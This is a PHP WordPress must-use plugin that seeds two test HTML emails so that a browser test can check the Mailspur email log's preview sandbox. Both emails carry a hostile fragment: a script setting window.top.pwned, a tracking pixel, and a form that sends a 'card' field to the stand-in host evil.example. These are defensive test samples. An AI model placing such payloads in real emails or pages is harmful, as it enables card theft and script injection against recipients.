<?php
/**
 * Must-use plugin (installed by seed.d/views.php) for the preview-looks browser test:
 * wp-admin/?mailspur-e2e-seed=views inserts two HTML mails (subjects contain "[PV]") – one with its own
 * dark-mode styles and a plain-text alternative, one without either. Both carry a script, a form and a
 * tracking pixel, so the sandbox can be checked in every look. The spec deletes them again.
 *
 * phpcs:disable WordPress.NamingConventions.PrefixAllGlobals, WordPress.Security.NonceVerification.Recommended
 *
 * @package Mailspur
 */

use Mailspur\Repository;

add_action(
	'admin_init',
	static function () {
		if ( ! isset( $_GET['mailspur-e2e-seed'] ) || 'views' !== $_GET['mailspur-e2e-seed'] || ! current_user_can( 'manage_options' ) || ! class_exists( Repository::class ) ) {
			return;
		}
		$repository = new Repository();
		$hostile    = '<img src="https://example.com/pv-pixel.gif" width="1" height="1" alt="">'
			. '<script>window.top.pwned = 1;</script>'
			. '<form action="https://evil.example/collect"><input name="card"><button>Confirm</button></form>';
		$dark       = '<html><head><meta name="color-scheme" content="light dark"><style>'
			. 'body{background:#ffffff;color:#222222}'
			. '@media (prefers-color-scheme: dark){body{background:#101010 !important;color:#eeeeee !important}}'
			. '@media (prefers-color-scheme: light){h1{color:#b32d2e}}'
			. '</style></head><body>'
			. '<div style="display:none;max-height:0">Hidden preheader</div>'
			. '<table width="600" style="width:600px"><tr><td><h1>Dark-ready newsletter</h1>'
			. '<p>Read <a href="https://shop.example/blog">the blog</a> or write to <a href="mailto:hi@shop.example">hi@shop.example</a>.</p>'
			. '<ul><li>First</li><li>Second</li></ul>'
			. '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="Logo"></td></tr></table>'
			. $hostile . '</body></html>';
		$plain      = '<div style="max-width:560px;margin:0 auto;font-family:Arial,sans-serif;color:#1d2327">'
			. '<h1 style="background:#2271b1;color:#fff;padding:16px">Light only</h1><p>No dark styles here.</p>' . $hostile . '</div>';

		$base = array(
			'created_at'   => gmdate( 'Y-m-d H:i:s' ),
			'status'       => Repository::STATUS_SENT,
			'recipients'   => 'looks@example.com',
			'headers'      => "From: Shop <shop@example.com>\nContent-Type: text/html; charset=UTF-8",
			'attachments'  => '',
			'content_type' => 'text/html',
			'sender'       => 'Shop <shop@example.com>',
			'source'       => 'core',
			'error'        => '',
			'notes'        => 0,
			'raw'          => '',
		);
		$rows = array(
			array(
				'subject' => '[PV] Dark-ready newsletter',
				'message' => $dark,
				'meta'    => '{"plain_text":true}',
			),
			array(
				'subject' => '[PV] Light only',
				'message' => $plain,
				'meta'    => '{"plain_text":false}',
			),
		);
		foreach ( $rows as $row ) {
			$row['size'] = strlen( $row['message'] );
			$repository->insert( array_merge( $base, $row ) );
		}
		wp_safe_redirect( admin_url( 'admin.php?page=mailspur-email-log&s=%5BPV%5D' ) );
		exit;
	}
);
